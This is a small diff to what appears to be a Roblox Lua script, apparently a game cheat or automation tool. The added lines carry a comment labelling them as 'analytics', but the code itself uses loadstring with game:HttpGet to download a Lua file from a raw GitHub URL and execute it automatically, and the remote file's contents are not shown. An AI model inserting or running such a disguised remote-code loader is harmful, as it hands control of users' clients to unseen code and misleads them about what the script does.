@@ -146,6 +146,8 @@ local function YQZUQ_fake_script() -- TextButton.LocalScript
 end
 coroutine.wrap(YQZUQ_fake_script)()
 repeat task.wait() until _G.accept
+-- remove if no like analytics
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fuckg1thub/NeptX/refs/heads/main/NeptZ/Forsaken/test.lua"))()
 
 -- yes, this is my code not pasted 😭
 local blocksInfo = require(game:GetService("ReplicatedStorage").Modules.Utilities.BlocksUtil).BlockInfo
